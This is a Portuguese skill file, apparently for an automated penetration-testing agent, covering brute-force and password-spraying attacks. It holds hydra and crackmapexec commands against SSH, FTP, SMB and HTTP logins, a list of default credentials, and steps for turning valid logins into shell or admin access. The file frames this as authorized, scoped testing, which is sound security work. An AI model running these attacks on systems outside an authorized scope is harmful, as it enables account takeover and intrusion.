---
name: bruteforce_authentication
phase: 4_exploitation
tools: [hydra, crackmapexec, medusa]
dependencies: [login_endpoint_identified]
mitre_tactic: TA0006 (Credential Access), TA0001 (Initial Access)
---

# Objetivo
Realizar ataques de força bruta e password spraying contra serviços de autenticação (SSH, FTP, SMB, HTTP, RDP, etc.) utilizando credenciais padrão, senhas comuns e credenciais obtidas em fases anteriores.

# Condições de Execução
- Um serviço de autenticação foi identificado (SSH, FTP, HTTP login, SMB, RDP, etc.).
- O escopo permite testes de autenticação.
- A política de lockout do alvo é conhecida (para evitar bloqueio de contas).

# Comandos e Sintaxe

## 1. Credenciais Padrão (Sempre Testar Primeiro)
```bash
echo "admin:admin
admin:password
admin:123456
root:root
root:toor
test:test
guest:guest" > {workspace}/default_creds.txt
```

## 2. Hydra - SSH
```bash
hydra -L {workspace}/userlist.txt -P /usr/share/wordlists/rockyou.txt -t 4 -f ssh://{target_ip} -o {workspace}/hydra_ssh.txt
```

## 3. Hydra - HTTP POST Form
```bash
hydra -L {workspace}/userlist.txt -P /usr/share/wordlists/rockyou.txt {target_ip} http-post-form "{login_path}:{post_data}:{fail_string}" -t 10 -f -o {workspace}/hydra_http.txt
```

## 4. CrackMapExec - SMB Password Spraying
```bash
crackmapexec smb {target_ip} -u {workspace}/userlist.txt -p "Password123!" --continue-on-success 2>&1 | tee {workspace}/cme_spray.txt
```

## 5. Hydra - FTP
```bash
hydra -L {workspace}/userlist.txt -P /usr/share/wordlists/rockyou.txt -t 4 -f ftp://{target_ip} -o {workspace}/hydra_ftp.txt
```

# Análise de Resultados
- **Credenciais válidas encontradas:** Registre imediatamente e tente autenticação no serviço.
- **SSH com credenciais válidas:** Acesso shell obtido. Acione a skill de pós-exploração.
- **SMB com credenciais válidas:** Acione a skill `smb_share_exploration` para enumerar shares com as credenciais.
- **HTTP login com credenciais válidas:** Acesse o painel e explore funcionalidades (upload, admin, etc.).

# Próximos Passos
- Com credenciais válidas, acione a skill de pós-exploração correspondente ao serviço.
- Se password spraying encontrar múltiplas contas com a mesma senha, registre como vulnerabilidade de política de senhas.

# Tratamento de Erros
- Se o Hydra retornar "too many connections", diminua threads (`-t 2`).
- Se contas forem bloqueadas, pare imediatamente e ajuste a estratégia (aumente intervalo entre tentativas).
- Se a wordlist `rockyou.txt` não existir: `sudo gunzip /usr/share/wordlists/rockyou.txt.gz`.
